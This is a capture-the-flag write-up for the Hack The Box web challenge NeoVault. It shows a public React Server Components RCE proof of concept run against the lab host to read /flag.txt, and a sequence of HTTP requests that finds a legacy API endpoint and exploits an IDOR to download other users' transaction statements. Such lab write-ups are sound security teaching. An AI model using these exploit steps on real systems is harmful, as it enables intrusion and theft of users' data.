---
title: NeoVault - HTB Challenge
description: Easy IDOR-based web challenge hosted on HTB Labs.
date: 2026-10-19
category: writeup
tags:
  - web
  - ctf
  - htb
  - easy
cover: ctf_banner
published: true
---

[NeoVault](https://app.hackthebox.com/challenges/NeoVault?tab=play_challenge) is a web CTF rated at easy difficulty. The official solution involves navigating the exposed API to infer a previous iteration of the interface still available. Leveraging the verbose errors retrieved from a pdf-generating endpoint we can then request documents using an arbitrary id, revealing the flag.
## Cheesy solution

The application is vulnerable to [react2shell](https://react2shell.com/) .
Using a publicly available [POC](https://github.com/surajhacx/react2shellpoc) we can execute commands on the machine and obtain the flag:

```shell
> python poc.py -t http://154.57.164.78:40511/ -c "cat /flag.txt"


      /\
     /**\
    /****\
   /******\
  /********\
 /**********\
      ||

    [CVE-2025-55182 React Server Components RCE]


[*] EXPLOITATION PARAMETERS
────────────────────────────────────────────────────────────
  TARGET    : http://154.57.164.78:40511/
  PAYLOAD   : cat /flag.txt
────────────────────────────────────────────────────────────

[*] Initiating exploitation sequence...
[*] Establishing connection to target...

[+] EXPLOITATION SUCCESSFUL
────────────────────────────────────────────────────────────
  ▸ HTB{REDACTED}
────────────────────────────────────────────────────────────
```
## Intended Solution

We begin registering an account and logging in.
The application presents several functionalities:

![[neovault_dashboard.png]]

### Reconnaissance

After testing out the available endpoints, we gather the following relevant information:

- The endpoint for 'Deposit' returns an error 301

Request: 

```http request
POST /api/v2/transactions/deposit HTTP/1.1
Host: 154.57.164.78:40511
<..>

{"amount":1}
```

Response:

```http
HTTP/1.1 301 Moved Permanently
Server: nginx/1.22.1
<..>

{"message":"Under maintenance","error":"v2 version is under maintenance"}
```

- The endpoint for 'Transfer' employs a second endpoint that maps an username to its id

Request:

```http
GET /api/v2/auth/inquire?username=neo_system HTTP/1.1
Host: 154.57.164.78:40511
<..>
```

Response:

```http
HTTP/1.1 200 OK
Server: nginx/1.22.1
<..>

{"_id":"6ad61fb7639347cb9ccb1bfb","username":"neo_system"}
```

### Vulnerability Discovery

The error received suggests that there's another version of the API available. We start the hunt with the most logic attempt: `v1` .
Editing the URL for every API service we discover that the PDF generation endpoint exposes both a `v2` and `v1` version, with the latter returning a message once requested with no parameters:

Original Request:

```http
POST /api/v2/transactions/download-transactions HTTP/1.1
Host: 154.57.164.78:40511
<..>

{}
```

Modified Request:

```http
POST /api/v1/transactions/download-transactions HTTP/1.1
Host: 154.57.164.78:40511
<..>

{}
```

Response:

```http
HTTP/1.1 404 Not Found
Server: nginx/1.22.1
<..>

{"message":"_id is not provided"}
```

We can infer that the `_id` parameter we're talking about is the user identifier. Here's where the previously found endpoint for username-id association shines: we pass the identifier of the user `neo_system`, the one we know about from our dashboard, and take a look at their transactions PDF.

Request:

```http
POST /api/v1/transactions/download-transactions HTTP/1.1
Host: 154.57.164.78:40511
<..>

{
"_id":"6ad61fb7639347cb9ccb1bfb"
}
```

Response:

![[neovault_statement1.png]]

## Exploit

As we've seen, the discovered endpoint suffers from an IDOR vulnerability, granting a logged in user the ability to check any user transactions.
In particular, we can now see that the user `neo_vault` has sent a transaction towards the user `user_with_flag` . As the contact suggests, this is the user that can lead us to the flag.
We repeat the steps employed above to recover the id parameter and request the PDF, exfiltrating the flag among the transactions:

![[neovault_statement2.png]]

## Findings

We can summarize the findings in this challenge as follows:

| Title          | CVSS Vector                         | CVSS Score | Severity |
| -------------- | ----------------------------------- | ---------- | -------- |
| Verbose Errors | AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N | 5.3        | Medium   |
| IDOR           | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N | 7.5        | High     |

## Outcome

The challenge highlights one of the most underrated aspects of offensive security: proper reconnaissance.
In particular, the setup showed how the presence of verbose errors in production can lead to discovering vulnerable endpoints, eventually converting into more severe findings.
